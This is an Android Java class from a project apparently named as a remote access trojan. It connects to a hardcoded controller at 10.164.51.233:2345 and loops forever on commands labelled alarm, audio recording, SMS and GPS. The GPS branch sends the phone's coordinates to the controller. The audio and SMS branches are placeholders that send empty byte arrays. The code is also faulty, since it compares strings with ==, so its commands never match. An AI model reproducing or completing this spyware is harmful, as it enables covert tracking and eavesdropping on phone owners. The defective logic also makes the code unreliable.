package rat.rata2;


import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import Controlador.GPSPacket;

public class bucle extends AsyncTask<Void, Integer, Boolean> {// cosas de entrada, forma que voy a indicar el progreso, lo que devuelvo
    SocketManager socket;
    String resp;
    //Se declara un buffer de lectura del dato escrito por el usuario por teclado
    //es necesario pq no es un buffer propio de los sockets
    BufferedReader inFromUser = new BufferedReader(new InputStreamReader(System.in));

        @Override
        protected Boolean doInBackground(Void... params) {
            try {
              socket = new  SocketManager("10.164.51.233", 2345); // ----------------------------------------------------IP
                Log.i("socket creado", "bucle");
            } catch (IOException e) {
                Log.i("socket no creado fallo", "bucle");
                e.printStackTrace();
            }
            while(true) { // bucle infinito que estara escuchando peticiones
                try {
                    resp = socket.Leer();
                    Log.i("La peticion es",resp);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                    if (resp == "alarma") {
                        try {
                            String info = socket.Leer();
                            String [] array = info.split(":");

                            int hora= Integer.parseInt(array[0]); // hora de la alarma
                            int mins= Integer.parseInt(array[1]); // mins de la alarma

                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    } else if (resp == "audio") {
                        try {
                            String numero = socket.Leer();
                            int segs = Integer.parseInt(numero);// numero de segundos que se quiere grabar

                            byte[] datos = new byte[11];

                            try {
                                socket.sendBytes(datos,datos.length);
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                    } else if (resp == "sms") {
                        // opcion 3
                        byte[] datos = new byte[11];

                        try {
                            socket.sendBytes(datos,datos.length);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }else if (resp== "gps"){
                        try {
                            GPSPacket gps = new GPSPacket();
                            String location= "Latitud: "+gps.getLatitude()+"Longitud: "+ gps.getLongitude();
                            socket.Escribir(location+ '\n');
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
            }
        }
    }
